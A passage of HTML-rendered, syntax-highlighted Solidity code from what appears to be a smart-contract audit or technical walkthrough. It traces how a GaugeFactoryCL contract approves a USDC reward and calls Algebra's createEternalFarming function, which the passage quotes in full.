class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10,000 USDC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// GaugeFactoryCL approves AlgebraEternalFarming to spend its USDC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/* USDC_ADDRESS */\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Call to AlgebraEternalFarming which will pull the approved USDC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalFarmingCustom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParamsWithReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"5\"\u003e\n\u003cli\u003eExecution within \u003ccode\u003eAlgebraEternalFarming.createEternalFarming()\u003c/code\u003e \u003ca href=\"https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L125\"\u003ehere\u003c/a\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e/// @inheritdoc IAlgebraEternalFarming\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eplugin\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyIncentiveMaker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eplugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eplugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epluginNotConnected\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFarmingPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eanotherFarmingIsActive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eEternalVirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFarmingCenter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingCenter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnectVirtualPoolToPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFarmingPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumOfIncentives\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveKeys\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecompute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentives\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroRewardAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunchecked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminimalPositionWidth\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt; (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTickMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMAX_TICK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTickMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMIN_TICK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eminimalPositionWidthTooWide\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPoolAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminimalPositionWidth\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminimalPositionWidth\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eEternalFarmingCreated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminimalPositionWidth\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 